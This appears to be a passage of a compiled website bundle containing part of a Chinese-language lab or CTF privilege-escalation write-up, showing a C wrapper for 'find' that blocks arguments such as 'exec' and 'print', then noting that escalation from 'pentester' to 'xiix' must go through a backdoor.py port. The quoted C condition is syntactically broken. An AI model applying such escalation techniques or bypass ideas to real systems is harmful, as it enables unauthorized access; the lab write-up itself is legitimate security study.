argc; i++) {\n        if (strstr(argv[i], "exec") != NULL ||\n            strstr(argv[i], "ok") != NULL ||\n            strstr(argv[i], "print") != NULL ||\n            strstr(argv[i], "fls") != NULL ||\n            fprintf(stderr, ERROR_MSG);\n            return 1;\n        }\n    }\n\n    char *real_argv[argc + 1];\n    real_argv[0] = REAL_FIND;\n    for (int i = 1; i < argc; i++) {\n        real_argv[i] = argv[i];\n    }\n    real_argv[argc] = NULL;\n\n    execv(REAL_FIND, real_argv);\n    perror("Execute Error!");\n    return 1;\n}\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u57fa\u672c\u4e0a\u6ca1\u6709\u53ef\u5229\u7528\u7684\u70b9\u4e86\uff0c\u6240\u4ee5\u5bf9\u4e8e ",(0,r.jsx)(n.code,{children:"pentester --\x3e xiix"})," \u7684\u63d0\u6743\u8def\u5f84\uff0c\u8fd8\u662f\u4e0e ",(0,r.jsx)(n.code,{children:"/srv/backdoor.py"})," \u7684\u7aef\u53e3\u8fdb\u884c\u4ea4\u4e92"]})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(l,{...e})}):l(e)}},28434:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20250408-150831-0d30273a962e6ad081514da4fed88f91.png"},61582:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20250408-150857-003ca168080065fb96d9b22808842c8e.png"},53386:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20250413-151331-2f9243d31aef7db69c5223b646d5359c.png"},38670:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20250414-151455-5c6fcd3a6145609aade0088f2cd64fbf.png"},92729:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20250415-151510-92db73b4ed66a802ffa58e95c8cd7011.png"},86259:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20250419-151949-a612b149c4cdb4767ff35b472a15b637.png"},99879:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20250422-152201-1ff3374521f16c4277efcf647d1931b9.png"},98965:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20250423-152309-825116f1c2d2f315ea094b6149200419.png"},52701:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20250425-152516-b4bd1e6e09fd09bfce2ac359899843d5.png"},19328:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20250426-152637-d57c777074151eeadd1f68b72e43cfae.png"},14513:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20250427-152741-35a042640f5003c7fd8cb9007c70afec.png"},59099:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20250428-152841-4811eda6eb5817ed6ff0cead98fec95c.png"},91220:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20250432-153254-91f9533c5f9d94fa0a5c1d643ecab92a.png"},28453:(e,n,s)=>{s.d(n,{R:()=>a,x:()=>d});var i=s(96540);const r={},t=i.createContext(r);function a(e){const n=i.useContext(t);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function d(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),i.createElement(t.Provider,{value:n},e.children)}}}]);